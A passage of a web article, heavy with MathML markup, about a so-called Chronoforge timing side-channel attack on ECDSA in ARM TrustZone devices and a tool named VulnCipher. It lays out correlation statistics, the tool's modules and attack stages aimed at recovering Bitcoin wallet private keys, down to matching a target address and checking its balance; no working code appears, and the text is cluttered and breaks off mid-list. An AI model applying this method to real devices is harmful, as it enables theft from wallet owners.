style="box-sizing: inherit; vertical-align: inherit;">∑</font></font></mo><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn></mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">n</font></font></mi></munderover><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">H</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">b</font></font></mi><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">m</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><mover accent="true"><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">H</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">b</font></font></mi><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo stretchy="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">‾</font></font></mo></mover><msup><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">2</font></font></mn></msup></mrow></msqrt></mrow></mfrac><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><mspace width="1em"></mspace><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">b</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∈</font></font></mo><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">{</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">}</font></font></mo><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">.</font></font></mi></mrow></semantics></math></p>



<p>The bit is restored as:<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mstyle mathcolor="#cc0000"><mtext>\*</mtext></mstyle></msubsup><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mi>arg</mi><mo>⁡</mo><munder><mrow><mi>max</mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">⁡</font></font></mo></mrow><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">b</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∈</font></font></mo><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">{</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">}</font></font></mo></mrow></munder><mrow><mo fence="true">∣</mo><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">b</font></font></mi><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo fence="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mo></mrow><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">.</font></font></mi></mrow></semantics></math></p>



<p>Standard statistical tests (t-statistics, p-value) are used to assess significance. For example, the t-observed value is:<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mtext>obs</mtext></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mfrac><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><msqrt><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">n</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">2</font></font></mn></mrow></msqrt></mrow><msqrt><mrow><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><msup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">2</font></font></mn></msup></mrow></msqrt></mfrac><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo></mrow></semantics></math></p>



<p>and the corresponding p-value:<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">2</font></font></mn><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">⋅</font></font></mo><mi>P</mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><mo>&gt;</mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">obs</font></font></mtext></msub><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">.</font></font></mi></mrow></semantics></math></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="vulncipher"><a href="https://vulncipher.ru/">VulnCipher Architecture</a></h2>



<p>VulnCipher consists of the following main modules:</p>



<ol class="wp-block-list">
<li><strong>Timing Collection Module (TCM)</strong><br>is responsible for high-precision collection of timing data:<ul><li>use of hardware timers with microsecond (or better) accuracy;</li><li>collection of a large number of measurements (from<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>10</mn><mn>4</mn></msup></mrow></semantics></math>104 to<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">10</font></font></mn><mn>6</mn></msup></mrow></semantics></math>106 samples);</li><li>primary filtering of outliers, for example according to the rule<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">s</font></font></mi></mrow></semantics></math>3p:</li></ul><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">use&nbsp;</font></font></mtext><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">, If&nbsp;</font></font></mtext><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><mover accent="true"><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">ˉ</font></font></mo></mover><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><mo>≤</mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">3</font></font></mn><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">s</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi></msub><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">.</font></font></mi></mrow></semantics></math>use Ti if ∣Ti−Tˉ∣≤3σT.</li>



<li><strong>Preprocessing Engine (PE)</strong><br>Time Series Normalization and Cleaning:
<ul class="wp-block-list">
<li>z-score normalization:<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mfrac><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">m</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi></msub></mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">s</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi></msub></mfrac></mrow></semantics></math>Ti′=σTTi−μT;</li>



<li>low-frequency noise suppression (e.g. wavelet filtering);</li>



<li>compensation for temperature and frequency drifts.</li>
</ul>
</li>



<li><strong>Hypothesis Generation Module (HGM)</strong><br>Generates hypotheses<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">H</font></font></mi><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">H</font></font></mi><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup></mrow></semantics></math>H0(k),H1(k) for each key bit, taking into account the ECDSA operation model on the target architecture (number of&nbsp;<code>point_add</code>,&nbsp;<code>point_double</code>, modular operations, etc.).</li>



<li><strong>Statistical Analysis Engine (SAE)</strong><br>Statistical Analysis Engine:
<ul class="wp-block-list">
<li>calculation of correlations<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>r</mi><mi>b</mi><mrow><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow></semantics></math>rb(k);</li>



<li><strong>Signal-to-Noise Ratio (SNR)</strong>&nbsp;estimation&nbsp;;</li>



<li>calculation of guessing entropy and other metrics.</li>
</ul>
</li>



<li><strong>Key Recovery Module (KRM)</strong><br>Recovers the key bit by bit, based on maximum correlations and confidence intervals:
<ul class="wp-block-list">
<li>first, a “raw” approximation of the key is constructed;</li>



<li>then there are weak positions (with a low difference<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><mn>1</mn></msub><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><mo>−</mo><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">r</font></font></mi><mn>0</mn></msub><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∣</font></font></mi></mrow></semantics></math>∣r1∣−∣r0∣);</li>



<li>local enumeration is carried out (beam search / limited brute force).</li>
</ul>
</li>



<li><strong>Validation &amp; Verification Module (VVM)</strong><br>Checks the correctness of the recovered key:
<ul class="wp-block-list">
<li>calculates the public key<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>d</mi><mo>⋅</mo><mi>G</mi></mrow></semantics></math>Q=d⋅G;</li>



<li>checks whether the derived&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin address</a>&nbsp;matches the target one;</li>



<li>optionally calls the blockchain API to check the balance.</li>
</ul>
</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-5-1024x773.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7694"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="vulncipher">VulnCipher’s operating algorithm</h2>



<p><a href="https://vulncipher.ru/">VulnCipher</a> operating model consists of several key stages:</p>



<h2 class="wp-block-heading">Stage 1: Reconnaissance and Target Selection</h2>



<ul class="wp-block-list">
<li>Determining the target&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin address</a>&nbsp;;</li>



<li>Identification of hardware platform (e.g. nRF52/nRF53, STM32, etc.);</li>



<li>Identifying the crypto library being used and checking whether it may be vulnerable to timing side-channels.</li>
</ul>



<h2 class="wp-block-heading">Step 2: Obtaining a timing oracle</h2>



<p>It is possible to repeatedly invoke the signature on the target device and measure the execution time:</p>



<pre class="wp-block-preformatted"></pre>



<h2 class="wp-block-heading">Step 3: Bulk Data Collection</h2>



<ul class="wp-block-list">
<li>Generating multiple messages<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mi>i</mi></msub></mrow></semantics></math>mi (random or with controlled Hamming weight);</li>



<li>Collection<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow></semantics></math>N timings<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub></mrow></semantics></math>Ti, where usually<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">N</font></font></mi><mo>∈</mo><mo stretchy="false">[</mo><msup><mn>10</mn><mn>4</mn></msup><mo separator="true">,</mo><msup><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">10</font></font></mn><mn>6</mn></msup><mo stretchy="false">]</mo></mrow></semantics></math>N∈[104,106];</li>



<li>Emissions cleaning and normalization.</li>
</ul>



<h2 class="wp-block-heading">Step 4: Generate hypotheses for key bits</h2>



<p>For variable-time implementation of ECDSA:</p>



<ul class="wp-block-list">
<li>If the scalar bit = 0 → only the doubling point is performed:&nbsp;<code>point_double</code>;</li>



<li>If bit = 1 →&nbsp;<code>point_double + point_add</code>.</li>
</ul>



<p>Model:<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mtext>bit</mtext><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mo>≈</mo><msub><mi>t</mi><mtext>base</mtext></msub><mo>+</mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mi>D</mi></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">+</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">ϵ</font></font></mi><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo></mrow></semantics></math><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">bit</font></font></mtext><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">≈</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mtext><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">base</font></font></mtext></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">+</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">D</font></font></mi></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">+</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mi>A</mi></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">+</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">ϵ</font></font></mi><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo></mrow></semantics></math></p>



<p>Where:</p>



<ul class="wp-block-list">
